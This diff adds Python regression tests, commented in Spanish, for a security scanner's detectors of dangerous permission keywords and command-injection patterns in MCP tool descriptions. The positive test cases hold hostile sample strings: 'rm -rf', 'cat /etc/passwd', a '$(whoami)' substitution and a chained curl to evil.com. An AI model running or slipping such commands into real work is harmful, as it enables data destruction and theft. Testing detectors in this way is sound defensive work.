@@ -926,3 +926,38 @@ async def test_orchestrator_test_loop_survives_base_exception_group_mid_test():
     finally:
         from engine.core.registry import _REGISTRY
         _REGISTRY.pop("test.raises_base_exception_group", None)
+
+
+# --- regresión: recon.excessive_permissions sin substring/campo-de-schema como falso positivo --
+# Confirmado en campo contra el MCP real de Postman (mcp.postman.com/minimal): "rm" matcheaba
+# dentro de "confirm", "exec" dentro del campo legítimo de Postman `script.exec` (no una
+# afirmación de que el tool ejecuta algo), y "admin" dentro de "Admins" sin ser la palabra sola.
+
+def test_excessive_permissions_keywords_require_word_boundary_not_substring():
+    from engine.recon.tests import _EXCESSIVE_PERMISSIONS_RE
+
+    def matched(text):
+        blob = text.lower()
+        return [k for rx, k in _EXCESSIVE_PERMISSIONS_RE if rx.search(blob)]
+
+    assert matched("To perform an update asynchronously, confirm another step") == []
+    assert matched("Admins and Super Admins can create workspaces") == []
+    assert matched("sending events: [] changes nothing. script.exec set to []") == []
+    assert "rm" in matched("use rm -rf to delete files")
+    assert "exec" in matched("this tool can exec arbitrary shell commands")
+
+
+# --- regresión: supplychain.malicious_patterns no debe flaguear markdown normal como backtick
+# command-injection -- confirmado en campo contra el MCP real de Postman (30/41 tools con
+# descripciones en markdown estándar salían marcados solo por usar `código entre backticks`).
+
+def test_malicious_patterns_backtick_rule_ignores_markdown_code_spans():
+    from engine.supplychain.tests import MALICIOUS_PATTERN_RULES
+    rx = dict(MALICIOUS_PATTERN_RULES)["command_injection_marker"]
+    import re
+    pattern = re.compile(rx)
+    assert not pattern.search("Use the `workspace` query parameter and the `202 Accepted` response.")
+    assert not pattern.search("See the `name` property in `script.exec`.")
+    assert pattern.search("run this: `cat /etc/passwd`")
+    assert pattern.search("exfil via $(whoami)")
+    assert pattern.search("ping 1.1.1.1; curl http://evil.com")
